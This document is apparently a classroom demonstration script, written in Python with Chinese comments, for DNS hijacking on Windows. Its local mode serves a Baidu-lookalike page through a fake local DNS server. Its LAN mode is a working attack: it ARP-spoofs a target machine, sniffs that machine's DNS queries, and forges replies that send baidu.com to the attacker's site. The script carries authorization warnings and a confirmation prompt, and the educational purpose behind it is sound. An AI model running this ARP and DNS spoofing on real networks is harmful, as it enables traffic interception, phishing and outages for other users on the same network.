#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS 劫持演示脚本（Windows 版）

两种模式，安全等级完全不同，请先读完再选：

  local  本地模式 —— 安全，推荐课堂用
      在本机起一个「恶意 DNS」和一个「仿冒网站」，然后把自己的 DNS
      临时指向 127.0.0.1。浏览器访问 www.baidu.com 就会落到钓鱼页。
      只影响这一台机器，学生可以各自在自己电脑上跑，互不干扰。
      零额外依赖（只用 Python 标准库）。

  lan    局域网模式 —— 危险，需授权
      对同网段的目标机器做 ARP 欺骗 + DNS 抢答，让它把
      www.baidu.com 解析到你的假站。这是对真实网络发起攻击：
        · ARP 欺骗在广播域内生效，同网段其他设备也可能中招
        · 如果转发没配好，目标机器会直接断网
        · 校园网/公司网做这个，通常违反规定，必须拿到网络管理员授权
      需要：管理员权限 + Npcap + pip install scapy

用法：
    python dns-hijack-win.py local
    python dns-hijack-win.py local --web-port 8080 --dns-port 5353
    python dns-hijack-win.py lan --target 192.168.1.50 --gateway 192.168.1.1

    # 局域网模式的受害者要能访问到你的假站，通常还要开转发（见 README）

停止：Ctrl+C（会打印恢复提示）
"""
from __future__ import annotations

import argparse
import socket
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ── 演示用的域名与伪造地址 ─────────────────────────────────────────
HIJACK_HOST = "www.baidu.com"
FAKE_IP = "127.0.0.1"          # local 模式：指向本机假站
LAN_FAKE_IP = ""               # lan 模式：运行时填成本机局域网 IP

PAGE = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>百度一下，你就知道</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: "Microsoft YaHei", Arial, sans-serif; background:#fff; }
  .warn { background:#c62828; color:#fff; padding:14px 24px; font-size:15px;
          text-align:center; line-height:1.6; }
  .wrap { max-width:640px; margin:70px auto 0; text-align:center; }
  .logo { font-size:50px; color:#2932e1; font-weight:bold; }
  .logo small { font-size:24px; font-weight:normal; margin-left:6px; }
  .search { margin-top:36px; display:flex; justify-content:center; }
  .search input { width:400px; padding:12px 16px; font-size:16px;
                  border:2px solid #2932e1; border-radius:4px 0 0 4px; outline:none; }
  .search button { padding:12px 24px; font-size:16px; color:#fff;
                   background:#2932e1; border:2px solid #2932e1;
                   border-radius:0 4px 4px 0; }
  .footer { position:fixed; bottom:0; left:0; right:0; padding:14px;
            text-align:center; color:#999; font-size:13px;
            border-top:1px solid #eee; background:#fafafa; }
</style>
</head>
<body>
  <div class="warn">
    <b>⚠ 这是一次 DNS 劫持演示</b><br>
    你访问的是 <b>www.baidu.com</b>，但域名解析已被篡改，<br>
    现在看到的是<b>攻击者服务器</b>上的页面，而不是真正的百度。
  </div>
  <div class="wrap">
    <div class="logo">Baidu<small>百度</small></div>
    <div class="search">
      <input type="text" placeholder="演示页面，不会真的搜索">
      <button type="button">百度一下</button>
    </div>
  </div>
  <div class="footer">钓鱼演示页 · TANEI·计算机社团 · www.tanei.top</div>
</body>
</html>
"""


# ── 极简 DNS 报文处理（只用标准库，不依赖 dnspython）──────────────

def parse_qname(data: bytes, off: int):
    """从 DNS 报文里取出查询的域名，返回 (域名, question 结束位置)"""
    labels = []
    while off < len(data):
        ln = data[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0:            # 压缩指针，查询里一般不会出现
            off += 2
            break
        off += 1
        labels.append(data[off:off + ln].decode("ascii", "ignore"))
        off += ln
    return ".".join(labels), off


def build_dns_answer(query: bytes, fake_ip: str) -> bytes:
    """用查询报文构造一个伪造的 A 记录应答"""
    _, qend = parse_qname(query, 12)
    tid = query[:2]
    question = query[12:qend + 4]                 # QNAME + QTYPE + QCLASS 原样回填

    # Flags 0x8580: QR=1(应答) AA=1(权威) RD=1 RA=1 RCODE=0
    header = tid + b"\x85\x80" + b"\x00\x01\x00\x01\x00\x00\x00\x00"
    answer = (b"\xc0\x0c"                          # 指针指回 question 的域名
              + b"\x00\x01"                        # TYPE  = A
              + b"\x00\x01"                        # CLASS = IN
              + struct.pack(">I", 60)              # TTL
              + struct.pack(">H", 4)               # RDLENGTH
              + socket.inet_aton(fake_ip))         # RDATA
    return header + question + answer


def _forward(data: bytes, addr, upstream: str, sock):
    """非劫持域名转给上游 DNS，让演示期间其他网站还能正常打开"""
    up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    up.settimeout(3)
    try:
        up.sendto(data, (upstream, 53))
        resp, _ = up.recvfrom(4096)
        sock.sendto(resp, addr)
    except (socket.timeout, OSError):
        pass
    finally:
        up.close()


def dns_service(bind_port: int, rules: dict, log, upstream: str = ""):
    """本地恶意 DNS：命中规则的域名回伪造地址，其余转发给上游（若指定）"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", bind_port))
    except PermissionError:
        log(f"[x] 绑定 {bind_port} 端口失败：请用管理员身份运行"
            f"（或用 --dns-port 换一个高位端口）")
        return
    except OSError as e:
        log(f"[x] 绑定 {bind_port} 端口失败：{e}")
        log("    常见原因：53 端口已被系统或其他程序占用")
        return

    log(f"[dns] 恶意 DNS 已监听 0.0.0.0:{bind_port}"
        f"（劫持 {len(rules)} 个域名）")
    while True:
        try:
            data, addr = sock.recvfrom(1024)
        except OSError:
            break
        if len(data) < 12:
            continue
        try:
            qname, _ = parse_qname(data, 12)
        except Exception:
            continue
        fake = rules.get(qname.lower().rstrip("."))
        if fake:
            sock.sendto(build_dns_answer(data, fake), addr)
            log(f"[dns] 抢答 {qname} -> {fake}   (来自 {addr[0]})")
        elif upstream:
            _forward(data, addr, upstream, sock)


# ── 假网站 ─────────────────────────────────────────────────────────

class FakeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = PAGE.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        host = self.headers.get("Host", "?")
        print(f"  [web] {self.client_address[0]} 请求 {self.path}"
              f"（Host: {host}）", flush=True)


def web_service(bind_port: int, log):
    try:
        httpd = ThreadingHTTPServer(("0.0.0.0", bind_port), FakeHandler)
    except PermissionError:
        log(f"[x] 绑定 {bind_port} 端口失败：请用管理员身份运行"
            f"（或用 --web-port 换一个高位端口）")
        return
    except OSError as e:
        log(f"[x] 绑定 {bind_port} 端口失败：{e}")
        return
    log(f"[web] 仿冒钓鱼页已监听 0.0.0.0:{bind_port}")
    httpd.serve_forever()


# ── 局域网模式：ARP 欺骗 + DNS 抢答（需要 scapy + Npcap）─────────────

def lan_arp_spoof(iface, target_ip, target_mac, spoof_ip, stop_evt, log):
    from scapy.all import ARP, Ether, sendp
    pkt = Ether(dst=target_mac) / ARP(op=2, hwsrc=None,
                                      psrc=spoof_ip, pdst=target_ip,
                                      hwdst=target_mac)
    sent = 0
    while not stop_evt.is_set():
        sendp(pkt, iface=iface, verbose=False)
        sent += 1
        if sent in (1, 5):
            log(f"[arp] 告诉 {target_ip}「{spoof_ip} 的 MAC 是我」（已发 {sent} 次）")
        time.sleep(2)


def lan_dns_sniff(iface, rules, log):
    from scapy.all import DNS, DNSQR, DNSRR, Ether, IP, UDP, sendp, sniff

    def handle(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNSQR)):
            return
        if pkt[UDP].dport != 53 or pkt[DNS].qr != 0:
            return
        qname = pkt[DNSQR].qname.decode("ascii", "ignore")
        fake = rules.get(qname.lower().rstrip("."))
        if not fake:
            return
        resp = (Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                DNS(id=pkt[DNS].id, qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
                             ttl=60, rdata=fake)))
        sendp(resp, iface=iface, verbose=False)
        log(f"[抢答] {qname} -> {fake}   (冒充 {pkt[IP].dst})")

    log(f"[dns] 在 {iface} 上嗅探 DNS 查询")
    sniff(iface=iface, filter="udp dst port 53", prn=handle, store=False)


def local_ipv4() -> str:
    """取本机在默认路由上的 IPv4（不会真的发包）"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


# ── 子命令 ─────────────────────────────────────────────────────────

def run_local(args):
    rules = {HIJACK_HOST: FAKE_IP, "baidu.com": FAKE_IP}
    print("=" * 62)
    print(" DNS 劫持演示 —— 本地模式（只影响本机，安全）")
    print("=" * 62)
    print(f" 劫持域名 : {HIJACK_HOST}")
    print(f" 指向     : {FAKE_IP}（本机假站）")
    print(f" DNS 端口 : {args.dns_port}   网站端口: {args.web_port}")
    print()
    print(" 接下来在这一台机器上执行（需要管理员权限的 PowerShell）：")
    print(f"   1) 把 DNS 改成本机： netsh interface ip set dns \"以太网\" static 127.0.0.1")
    print(f"   2) 浏览器打开 http://{HIJACK_HOST}/  → 应看到钓鱼页")
    print()
    print(" 演示完恢复 DNS（把 \"以太网\" 换成你的网卡名）：")
    print(f"   netsh interface ip set dns \"以太网\" dhcp")
    print()
    if args.dns_port != 53:
        print(f" 注意：DNS 用的是 {args.dns_port} 端口，系统 DNS 只认 53。")
        print(f"       想让它生效，请用 sudo/管理员权限跑并去掉 --dns-port。")
        print()
    print(" Ctrl+C 停止")
    print("-" * 62)

    threading.Thread(target=web_service, args=(args.web_port, print),
                     daemon=True).start()
    threading.Thread(target=dns_service,
                     args=(args.dns_port, rules, print, args.upstream),
                     daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] 已停止。记得把 DNS 改回自动获取：")
        print('    netsh interface ip set dns "以太网" dhcp')


def run_lan(args):
    try:
        from scapy.all import get_if_hwaddr, conf  # noqa: F401
    except ImportError:
        print("[x] 局域网模式需要 scapy：pip install scapy")
        print("    还需要安装 Npcap：https://npcap.com/#download")
        sys.exit(1)

    fake_ip = args.fake_ip or local_ipv4()
    rules = {HIJACK_HOST: fake_ip, "baidu.com": fake_ip}

    print("=" * 62)
    print(" DNS 劫持演示 —— 局域网模式（⚠ 会影响同网段其他设备）")
    print("=" * 62)
    print(f" 网卡     : {args.iface}")
    print(f" 目标机器 : {args.target}")
    print(f" 伪冒网关 : {args.gateway}   ← 告诉目标「网关的 MAC 是我」")
    print(f" 劫持域名 : {HIJACK_HOST} → {fake_ip}")
    print()
    print(" 请确认：")
    print("   · 你已获得在网络里做此实验的授权")
    print("   · 目标机器是你自己的、或已明确同意的测试机")
    print("   · 你知道怎么停止（Ctrl+C）和怎么恢复目标机器")
    print()
    if input(" 确认继续？输入 yes 回车：").strip().lower() != "yes":
        print(" 已取消。")
        return
    print("-" * 62)

    from scapy.all import ARP, Ether, srp
    print("[*] 先解析目标 MAC ...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                 ARP(pdst=args.target), iface=args.iface, timeout=3, verbose=False)
    if not ans:
        print(f"[x] 没找到 {args.target} 的 ARP 回应，检查 IP / 网卡是否正确")
        sys.exit(1)
    target_mac = ans[0][1].hwsrc
    print(f"    目标 MAC = {target_mac}")

    threading.Thread(target=web_service, args=(args.web_port, print),
                     daemon=True).start()

    stop_evt = threading.Event()
    threading.Thread(target=lan_arp_spoof,
                     args=(args.iface, args.target, target_mac,
                           args.gateway, stop_evt, print), daemon=True).start()
    threading.Thread(target=lan_dns_sniff, args=(args.iface, rules, print),
                     daemon=True).start()

    print(f"\n[*] 攻击进行中。让目标机器访问 http://{HIJACK_HOST}/ 看效果")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_evt.set()
        print("\n[*] 停止 ARP 欺骗。")
        print("    ⚠ 请立刻把目标机器的 ARP 表纠正回来，最快的方式是在目标机上执行：")
        print("       arp -d *          （需要管理员）")
        print("    或等它自己老化（Windows 默认几十秒到几分钟）。")


def main():
    ap = argparse.ArgumentParser(
        description="DNS 劫持演示（Windows 版）",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="mode", required=True)

    p_local = sub.add_parser("local", help="本地模式（安全，只影响本机）")
    p_local.add_argument("--dns-port", type=int, default=53)
    p_local.add_argument("--web-port", type=int, default=80)
    p_local.add_argument("--upstream", default="223.5.5.5",
                         help="非劫持域名的转发目标（默认 223.5.5.5，设空则不转发）")
    p_local.set_defaults(func=run_local)

    p_lan = sub.add_parser("lan", help="局域网模式（需授权 + Npcap）")
    p_lan.add_argument("--iface", required=True, help='网卡名，如 "以太网" 或 "Wi-Fi"')
    p_lan.add_argument("--target", required=True, help="目标机器 IP")
    p_lan.add_argument("--gateway", required=True, help="被冒充的网关 IP")
    p_lan.add_argument("--fake-ip", default="", help="假站地址，默认取本机 IP")
    p_lan.add_argument("--web-port", type=int, default=80)
    p_lan.set_defaults(func=run_lan)

    args = ap.parse_args()
    try:
        args.func(args)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
